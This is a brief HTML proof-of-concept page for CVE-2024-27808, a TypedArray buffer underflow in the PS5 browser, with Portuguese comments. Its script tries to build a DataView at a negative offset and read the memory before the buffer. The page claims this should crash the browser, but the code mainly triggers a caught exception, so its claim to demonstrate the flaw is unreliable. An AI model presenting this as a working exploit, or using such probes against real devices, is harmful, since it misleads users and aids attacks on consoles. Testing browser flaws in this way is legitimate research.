    <title>PoC - CVE-2024-27808 - TypedArray Buffer Underflow</title>

<body>
  <h1>PoC - CVE-2024-27808 - PS5 Browser Memory Underflow Test</h1>

  <script>
    try {
      console.log("[+] Iniciando teste de acesso inválido a memória...");

      // Criação de um ArrayBuffer pequeno
      var arr = new Uint32Array(1);

      // Tentar criar uma DataView a partir de um offset negativo (-4 bytes)
      var view = new DataView(arr.buffer, -4, 4);

      console.log("[!] Tentativa de leitura de memória inválida:");
      console.log(view.getUint32(0)); // Deve causar crash ou erro grave

    } catch (e) {
      console.error("[OK] Exceção capturada como esperado:", e);
    }
  </script>

</body>
